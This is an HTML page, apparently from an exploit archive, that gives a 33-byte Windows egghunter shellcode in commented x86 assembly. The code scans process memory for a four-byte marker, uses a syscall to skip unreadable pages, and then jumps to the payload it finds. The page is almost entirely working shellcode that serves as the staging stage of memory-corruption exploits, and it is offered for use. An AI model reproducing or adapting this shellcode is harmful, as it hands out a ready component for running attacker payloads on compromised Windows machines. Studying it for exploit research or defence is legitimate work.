<html><head><title>Windows - eggsearch shellcode - 33 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
; win32 eggsearch shellcode, 33 bytes
; tested on windows xp sp2, should work on all service packs on win2k, win xp, win2k3
; (c) 2009 by Georg 'oxff' Wicherski
 
[bits 32]
 
marker equ 0x1f217767   ; 'gw!\x1f'
 
start:
 xor edx, edx   ; edx = 0, pointer to examined address
 
address_loop:
 inc edx    ; edx++, try next address
 
pagestart_check:
 test dx, 0x0ffc   ; are we within the first 4 bytes of a page?
 jz address_loop   ; if so, try next address as previous page might be unreadable
     ; and the cmp [edx-4], marker might result in a segmentation fault
 
access_check:
 push edx   ; save across syscall
 push byte 8   ; eax = 8, syscall nr of AddAtomA
 pop eax    ; ^
 int 0x2e   ; fire syscall (eax = 8, edx = ptr)
 cmp al, 0x05   ; is result 0xc0000005? (a bit sloppy)
 pop edx    ;
 
 je address_loop   ; jmp if result was 0xc0000005
 
egg_check:
 cmp dword [edx-4], marker ; is our egg right before examined address?
 jne address_loop  ; if not, try next address
 
egg_execute:
 inc ebx    ; make sure, zf is not set
 jmp edx    ; we found our egg at [edx-4], so we can jmp to edx

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
